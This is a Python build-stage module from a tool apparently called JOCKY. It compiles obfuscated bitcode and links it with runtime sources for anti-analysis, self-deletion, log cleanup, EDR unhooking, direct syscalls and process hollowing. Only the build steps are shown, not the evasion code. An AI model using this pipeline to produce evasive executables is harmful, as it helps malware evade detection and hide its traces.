from jocky.core.stage import Stage
from jocky.core.context import BuildContext
from jocky.core.toolchain import discover_toolchain
from jocky.utils.subprocess import run_cmd
from pathlib import Path
import platform

class LinkStage(Stage):
    @property
    def name(self) -> str:
        return "link"

    def run(self, ctx: BuildContext) -> BuildContext:
        tc = discover_toolchain()
        obf_bc = ctx.state["llvm_obf_bc"]
        out_dir = ctx.get_stage_output_dir(self.name)
        output = ctx.output_dir / ctx.input_file.stem
        if ctx.config.get("output"):
            output = Path(ctx.config["output"])

        # Compile obfuscated bitcode to object
        obj_path = out_dir / "output.o"
        run_cmd([
            str(tc.clang()), "-c", str(obf_bc), "-o", str(obj_path)
        ], "Bitcode to object")

        # Compile runtime library sources
        runtime_objs = self._compile_runtime(tc, out_dir)

        # Link everything together
        link_cmd = [str(tc.clang()), str(obj_path)] + runtime_objs + ["-o", str(output)]
        if platform.system() == "Windows":
            link_cmd.extend(["-lntdll"])
        run_cmd(link_cmd, "Linking executable")

        ctx.state["executable"] = output
        ctx.state["object_file"] = obj_path
        return ctx

    def _compile_runtime(self, tc, out_dir: Path) -> list:
        """Compile the JOCKY runtime C sources and return list of .o paths."""
        script_dir = Path(__file__).parent.parent.parent.parent
        runtime_dir = script_dir / "src" / "runtime"
        if not runtime_dir.exists():
            return []

        # Portable sources (always compiled)
        portable_sources = [
            runtime_dir / "init" / "anti_analysis.c",
            runtime_dir / "cleanup" / "self_delete.c",
            runtime_dir / "cleanup" / "logs.c",
        ]

        # Windows-only sources
        windows_sources = []
        if platform.system() == "Windows":
            windows_sources = [
                runtime_dir / "evasion" / "unhook.c",
                runtime_dir / "evasion" / "syscalls.c",
                runtime_dir / "execution" / "hollow.c",
            ]

        all_sources = [s for s in portable_sources + windows_sources if s.exists()]
        if not all_sources:
            return []

        include_dir = runtime_dir / "include"
        objs = []
        for src in all_sources:
            obj = out_dir / f"{src.stem}.o"
            run_cmd([
                str(tc.clang()), "-O2", "-c",
                "-I", str(include_dir),
                str(src), "-o", str(obj)
            ], f"Compile runtime {src.name}")
            objs.append(str(obj))

        return objs
